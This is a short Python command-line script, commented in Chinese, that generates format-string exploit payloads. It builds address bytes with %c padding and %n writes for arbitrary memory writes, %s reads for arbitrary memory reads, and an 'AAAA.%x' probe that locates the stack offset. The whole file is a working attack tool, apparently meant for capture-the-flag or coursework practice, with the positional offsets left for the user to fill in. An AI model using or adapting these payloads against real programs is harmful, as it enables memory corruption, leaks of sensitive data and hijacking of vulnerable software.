#生成FotmatString漏洞的payload
import argparse
import sys

def w_payload(addr,value):
	payload = ''
	output = b''
	#地址的payload
	for i in range(4):
		output = output + (i+addr).to_bytes(4,'little')
		for j in range(4):
			payload = payload+r"\x{:x}".format((i+addr>>8*j)%0x100)
	#写入值的payload
	c = []
	for i in range(4):
		c.append(((value>>8*i)%0x100 -(16 if i==0 else c[i-1])+0x100) %0x100)
		payload = payload+r"%{:d}c".format(c[i])
		output = output+bytes(r"%{:d}c".format(c[i]),encoding='ASCII')
	payload = payload+"%()$n\n"
	output = output+b"%()$n\n"
	return payload,output

def r_payload(addr):
	payload = ''
	output =(addr).to_bytes(4,'little')
	for i in range(4):
		payload = payload+r"\x{:x}".format((addr>>8*i)%0x100)
	payload = payload+"%()$s\n"
	output = output+b"%()$s\n"
	return payload,output

def main():
	#参数
	parser = argparse.ArgumentParser(description="生成存在格式化字符串漏洞程序的Payload，括号部分要自己填啦")
	parser.add_argument('-n',action='store_true',dest='n',help='如果指定了该参数，将提供确定参数在栈中位置的Payload')
	parser.add_argument('-a',action='store',dest='addr',help="指定写入或查看的地址,必须指定")
	parser.add_argument('-w',action='store_true',dest='write',help='指定该参数为写入，默认是读取')
	parser.add_argument('-v',action='store',dest='value',help="指定写入的值，如果是十六进制需要以0x开头，否则认为是十进制")
	parser.add_argument('-f',action='store',dest='file',default='payload.obj',help="指定输出的文件名，如果是十六进制需要以0x开头，否则认为是十进制")
	arguments = parser.parse_args()
	
	#数据处理
	filename=arguments.file
	if arguments.n:
		payload = "AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n"
		output = b"AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n"
	elif (arguments.write):
		if (arguments.value is None or arguments.addr is None):
			print("你需要指定写入的值-v和写入的地址-a")
			sys.exit()
		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
		value = int(arguments.value,base=16) if arguments.value[0:2]=='0x' else int(arguments.value,base=10) 
		payload,output = w_payload(addr,value)
	else:	
		if (arguments.addr is None):
			print("你需要指定读取的地址-a")
			sys.exit()
		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
		payload,output = r_payload(addr)

	#输出部分
	print(payload,end='')
	with open(filename,'wb') as fileobj:
		fileobj.write(output)	

if __name__ == "__main__":
	main()